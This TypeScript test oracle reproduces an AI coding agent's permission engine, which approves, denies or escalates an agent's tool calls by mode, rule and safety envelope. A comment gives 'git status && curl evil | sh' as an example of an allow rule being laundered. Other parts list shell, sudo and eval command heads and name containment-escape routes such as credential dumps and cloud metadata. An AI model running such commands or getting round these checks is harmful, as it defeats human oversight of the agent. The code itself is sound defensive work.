// Test-only oracle (W3 D-27 round 2): mlpal-harness @ 22701ca, packages/harness/src/permission/engine.ts, verbatim but for
// its relative imports, which point at src/ (readonly-shell, containment, safety, safety-envelope are unchanged since
// 22701ca: `git diff --stat 22701ca -- packages/harness/src/permission/` touches only engine.ts and adds
// shell-decompose.ts). The differential asserts the live matcher never auto-approves what this one asked about.
import type { Author } from "@mlpal/harness-protocol";
import { isReadOnlyShell } from "../../../src/permission/readonly-shell";
import { containmentDeny } from "../../../src/permission/containment";
import { catastrophicDeny, contentSafetyDeny, redirectTargets, splitShellCommands } from "../../../src/permission/safety";
// Type-only: no runtime cycle even though safety-envelope imports globMatch from here.
import type { SafetyDisposition, SafetyReason } from "../../../src/permission/safety-envelope";

/**
 * Permission engine: a deny → allow → mode-default cascade. Pure data + string
 * matching, no model coupling. The `principal`
 * field distinguishes a human turn from a peer-agent-injected turn so peer actions
 * can be governed differently once inter-agent collaboration lands. See docs/05 §6/§7.
 */

/**
 * Autonomy levels, escalating by how much the agent does without asking:
 *   recon     — read-only; can read/search but not edit or run commands
 *   manual    — ask before every change (the safe default)
 *   cruise    — auto-approve file edits; still ask before running commands
 *   autopilot — allow everything, no prompts (sandboxes / CI / autonomous runs)
 */
export type PermissionMode = "recon" | "manual" | "cruise" | "autopilot";

/** Which layer of the cascade produced a deny — for the attempt trace, so a grader never parses text. */
export type DenySource = "hard_deny" | "deny_rule" | "safety" | "mode" | "tool_boundary" | "answers_policy";

/** A host's permission judge decided the ask (cruise), with its reason: carried onto the tool's
 *  result as `judged`, so a client can show who approved or refused the call. */
export interface JudgeNote {
  reason: string;
}

export type Decision =
  | { behavior: "allow"; judge?: JudgeNote }
  | { behavior: "deny"; reason: string; source?: DenySource; safetyReason?: SafetyReason; judge?: JudgeNote }
  // `safetyReason` marks an ask that came from the §10 envelope edge (vs an ordinary mode prompt),
  // so a headless run can turn it into a NEEDS_APPROVAL terminal instead of a plain denial.
  | { behavior: "ask"; reason?: string; safetyReason?: SafetyReason };

export interface PermissionRequest {
  toolName: string;
  input: Record<string, unknown>;
  readOnly: boolean;
  /** A file edit (Write/Edit) — auto-approved in accept-edits mode. */
  isEdit: boolean;
  /** A working-memory write (a `memory`-tagged tool). Not a change to the estate, so no mode
   *  guards it: recon admits it alongside reads. Deny rules and the hard denials still apply. */
  isMemory?: boolean;
  principal: Author;
}

export interface PermissionConfig {
  mode: PermissionMode;
  /** Rules like "Read", "Bash", or "Bash(git*)" — trailing * is a wildcard. */
  allow?: string[];
  deny?: string[];
  /**
   * v1.1 — the HOP safety envelope (§10). Host-provided closure: it builds the action (tool tags,
   * plan estimates) and run-state (a reviewed plan on record?) the pure evaluator needs, records
   * the attempt trace, and returns a disposition — or `null` when the envelope does not apply (no
   * safety block, or a read-only action). It runs AFTER the bypass-immune host denials and the
   * deny rules (neither can be widened by an envelope), but a safety `allow` short-circuits the
   * mode default: inside the envelope the loop is autonomous, so an in-envelope apply is not asked
   * per-step the way `cruise` would ask for command execution. `park` becomes an `ask` (the host
   * maps that to needs_approval headless); `deny` is a hard policy denial.
   */
  safety?: (req: PermissionRequest) => SafetyDisposition | null;
}

export type CanUseTool = (req: PermissionRequest) => Decision | Promise<Decision>;

function safetyReasonText(d: SafetyDisposition): string {
  return d.detail ? `${d.reason}: ${d.detail}` : (d.reason ?? "safety envelope");
}

export function createPolicy(config: PermissionConfig): CanUseTool {
  const deny = config.deny ?? [];
  const allow = config.allow ?? [];
  return (req) => {
    // Layer 0: the deterministic safety authority. Bypass-immune — no mode, allow-rule,
    // or model choice can override it. This is the whole point: allow is earned, deny is absolute.
    const hard = hardDeny(req);
    if (hard) return { behavior: "deny", reason: hard, source: "hard_deny" };
    // Autopilot asks nobody, so the containment-escape routes (cloud metadata, curl-pipe-shell,
    // privilege escalation, persistence, credential dumps) are refused outright there. In every
    // other mode the same commands reach the human through the mode default.
    if (config.mode === "autopilot" && req.toolName === "Bash") {
      const c = containmentDeny(String(req.input.command ?? ""));
      if (c) return { behavior: "deny", reason: c, source: "hard_deny" };
    }

    for (const rule of deny) {
      if (denyMatches(rule, req)) return { behavior: "deny", reason: `denied by rule "${rule}"`, source: "deny_rule" };
    }
    // The safety envelope decides after the host/user denials (it can never widen them) and before
    // allow rules + the mode default (an in-envelope allow is autonomous, so it bypasses them).
    if (config.safety) {
      const d = config.safety(req);
      if (d?.outcome === "deny") return { behavior: "deny", reason: safetyReasonText(d), source: "safety", safetyReason: d.reason };
      if (d?.outcome === "park") return { behavior: "ask", reason: safetyReasonText(d), safetyReason: d.reason };
      // recon is bypass-immune: an in-envelope allow makes a MUTATIVE action autonomous, and
      // recon exists precisely to refuse those. Fall through so the mode default denies it.
      if (d?.outcome === "allow" && config.mode !== "recon") return { behavior: "allow" };
      // d === null (or an allow under recon): fall through to the mode default.
    }
    for (const rule of allow) {
      if (ruleMatches(rule, req)) return { behavior: "allow" };
    }
    return defaultForMode(config.mode, req);
  };
}

/** The bypass-immune deny checks: catastrophic commands + protected-path writes. */
function hardDeny(req: PermissionRequest): string | null {
  if (req.toolName === "Bash") {
    const command = String(req.input.command ?? "");
    const cat = catastrophicDeny(command);
    if (cat) return cat;
    for (const target of redirectTargets(command)) {
      const cs = contentSafetyDeny(target);
      if (cs) return cs;
    }
    return null;
  }
  // File-writing tools: block protected paths (git internals, private keys, credentials).
  if ((req.toolName === "Write" || req.toolName === "Edit") && typeof req.input.path === "string") {
    return contentSafetyDeny(req.input.path);
  }
  return null;
}

/** The decision a mode makes for a request on its own — before allow/deny rules. Exported so the
 *  interactive gate can re-evaluate against the *live* mode: the session's policy captured the mode
 *  at run start, so raising autonomy mid-run (Shift+Tab) must be re-applied here to take effect. By
 *  the time a prompt fires, rules have already been consulted (a deny/allow rule resolves before the
 *  gate), so the live mode's own decision is the whole answer. */
export function defaultForMode(mode: PermissionMode, req: PermissionRequest): Decision {
  // A memory claim is not a change to the estate (memory v6 E5): every mode admits it the way it
  // admits a read. "recon never touches the estate" stays exact — Bash/Edit/infra remain blocked.
  const ungated = req.readOnly || req.isMemory === true;
  switch (mode) {
    case "autopilot":
      // allow everything, no prompts (sandboxes, CI, autonomous runs).
      return { behavior: "allow" };
    case "cruise":
      // reads + file edits go through, and so does a shell command every part of which is a known
      // read-only program (ls, git status, ps…: readonly-shell.ts); command execution that could
      // change anything, and MCP/web, still ask — that's where irreversible damage lives.
      if (ungated || req.isEdit) return { behavior: "allow" };
      if (req.toolName === "Bash" && typeof req.input.command === "string" && isReadOnlyShell(req.input.command)) return { behavior: "allow" };
      return { behavior: "ask" };
    case "recon":
      return ungated
        ? { behavior: "allow" }
        : { behavior: "deny", reason: "recon mode is read-only: changes are blocked", source: "mode" };
    default: // manual
      return ungated ? { behavior: "allow" } : { behavior: "ask" };
  }
}

/** Allow matching. For Bash it is sub-command aware with AND semantics: EVERY simple-command
 *  in a chain must match the pattern, so an allow like `Bash(git*)` auto-approves `git status`
 *  but NOT `git status && curl evil | sh` — a trailing `*` can no longer launder a compound
 *  command past the gate (the whole-command match `^git.*$` used to cover the entire chain). */
function ruleMatches(rule: string, req: PermissionRequest): boolean {
  const m = rule.match(/^([A-Za-z_]+)(?:\((.*)\))?$/);
  if (!m) return false;
  const tool = m[1]!;
  const pattern = m[2];
  if (tool !== req.toolName) return false;
  if (pattern === undefined) return true;
  if (req.toolName === "Bash") {
    const subs = splitShellCommands(String(req.input.command ?? ""));
    return subs.length > 0 && subs.every((sub) => globMatch(pattern, sub));
  }
  return globMatch(pattern, representativeArg(req));
}

/** The tool part of a deny rule or an approval entry (P7 1.7): an exact name, or a glob whose only wildcard is `*`,
 *  case-sensitive (`Deploy*` names `DeployProd`; `mcp__github__*` every tool of that server). */
function toolMatches(tool: string, name: string): boolean {
  return tool.includes("*") ? globMatch(tool, name) : tool === name;
}

/** Deny matching is sub-command aware for Bash: a rule fires if ANY simple-command in a
 *  chain matches, so `Bash(rm*)` catches `git status && rm x`. (Allow stays whole-command,
 *  so a partial match can never auto-approve a compound command.) The tool part takes P7's characters and `*` (a
 *  publication's approvals are deny rules here): a rule that parsed before still means the same, and a deny or an
 *  approval can only ever name more tools, never fewer. */
function denyMatches(rule: string, req: PermissionRequest): boolean {
  const m = rule.match(/^([A-Za-z0-9_*:.-]+)(?:\((.*)\))?$/);
  if (!m) return false;
  if (!toolMatches(m[1]!, req.toolName)) return false;
  const pattern = m[2];
  if (pattern === undefined) return true;
  if (req.toolName === "Bash") {
    // Fail closed: a command the splitter cannot fully decompose into simple commands fires every deny rule and every
    // approval on Bash, whatever its pattern; a governance control is never passed by an unparsed shape.
    const { subs, opaque } = bashSubjects(String(req.input.command ?? ""));
    return opaque || subs.some((sub) => globMatch(pattern, sub));
  }
  return globMatch(pattern, representativeArg(req));
}

/** Prefixes that run the command after them: stripped (with nothing but the command after them). */
const RUNS_NEXT = new Set(["env", "command", "time", "nohup"]);
/** A first word that runs something the matcher cannot see: a shell, `eval`, `xargs`, `exec`, a privilege wrapper. */
const OPAQUE_HEAD = new Set(["xargs", "eval", "exec", "source", ".", "sudo", "doas", "su", "bash", "sh", "zsh", "dash", "ksh", "fish", "busybox"]);
/** Shell syntax that wraps commands the splitter does not open (compound commands, groups, negation). */
const KEYWORD = new Set(["if", "then", "else", "elif", "fi", "for", "while", "until", "do", "done", "case", "esac", "select", "function", "in", "!", "{", "}", "[[", "]]", "coproc"]);
const basename = (w: string) => w.slice(w.lastIndexOf("/") + 1);

/** One simple command as a rule sees it: whitespace collapsed, leading `VAR=…` and the `env`/`command`/`time`/`nohup`
 *  prefixes stripped, the command's path and a leading backslash reduced to its name; null when it is not a simple
 *  command the matcher understands (a group, a subshell, a compound, a shell or `eval` or `xargs` running more). */
export function normaliseSimpleCommand(sub: string): string | null {
  if (/^[({]/.test(sub)) return null;
  const words = sub.split(/\s+/).filter(Boolean);
  for (;;) {
    const w = words[0];
    if (w === undefined) return "";
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) {
      words.shift();
      continue;
    }
    if (RUNS_NEXT.has(basename(w))) {
      if (words[1]?.startsWith("-")) return null;
      words.shift();
      continue;
    }
    break;
  }
  const head = basename(words[0]!.replace(/^\\+/, ""));
  if (KEYWORD.has(head) || OPAQUE_HEAD.has(head)) return null;
  return [head, ...words.slice(1)].join(" ");
}

/** A `$(` or a backtick inside double quotes: a command the splitter does not open. */
function substitutionInQuotes(command: string): boolean {
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < command.length; i++) {
    const c = command[i]!;
    if (c === "\\" && quote !== "'") {
      i++;
      continue;
    }
    if (quote === "'") {
      if (c === "'") quote = null;
      continue;
    }
    if (quote === '"') {
      if (c === '"') quote = null;
      else if (c === "`" || (c === "$" && command[i + 1] === "(")) return true;
      continue;
    }
    if (c === '"' || c === "'") quote = c;
  }
  return false;
}

/** The simple commands a Bash command runs, normalised, and whether any part of it could not be decomposed. */
export function bashSubjects(command: string): { subs: string[]; opaque: boolean } {
  // Arithmetic expansion (`$((6 * 7))`) runs no command: a literal, so the splitter does not read it as a subshell.
  command = command.replace(/\$\(\([^()]*\)\)/g, "0");
  if (substitutionInQuotes(command)) return { subs: [], opaque: true };
  const subs: string[] = [];
  for (const raw of splitShellCommands(command)) {
    const sub = normaliseSimpleCommand(raw);
    if (sub === null) return { subs: [], opaque: true };
    if (sub) subs.push(sub);
  }
  return { subs, opaque: false };
}

// `u`: the glob's 1-256 counts code points, as Python does (an astral character is one, not two UTF-16 units).
const APPROVAL_ENTRY = /^([A-Za-z0-9_*:.-]{1,128})(?:\((.{1,256})\))?$/u;
/** A character Python's `str.isprintable` refuses (a control, format, separator other than the space, unassigned). */
const UNPRINTABLE = /[\p{C}\p{Zl}\p{Zp}]|(?! )\p{Zs}/u;

/**
 * An `approvals_required` entry under P7 1.7's grammar (hop-service's `_approval`): `Tool` or `Tool(<arg-glob>)`, the
 * tool `[A-Za-z0-9_*:.-]{1,128}`, the glob 1-256 printable characters with balanced parentheses, nothing around it.
 * Null when it does not parse: the engine refuses such an entry rather than skip it.
 */
export function parseApprovalEntry(entry: string): { tool: string; pattern?: string } | null {
  const m = APPROVAL_ENTRY.exec(entry);
  if (!m || UNPRINTABLE.test(entry)) return null;
  const pattern = m[2];
  if (pattern !== undefined) {
    let depth = 0;
    for (const c of pattern) {
      depth += c === "(" ? 1 : c === ")" ? -1 : 0;
      if (depth < 0) return null;
    }
    if (depth !== 0) return null;
  }
  return { tool: m[1]!, ...(pattern !== undefined ? { pattern } : {}) };
}

/** The arg a rule pattern is matched against, per tool. */
function representativeArg(req: PermissionRequest): string {
  if (req.toolName === "Bash") return String(req.input.command ?? "");
  if (typeof req.input.path === "string") return req.input.path;
  return JSON.stringify(req.input);
}

export function globMatch(pattern: string, value: string): boolean {
  const re = new RegExp(
    `^${pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*")}$`,
  );
  return re.test(value);
}
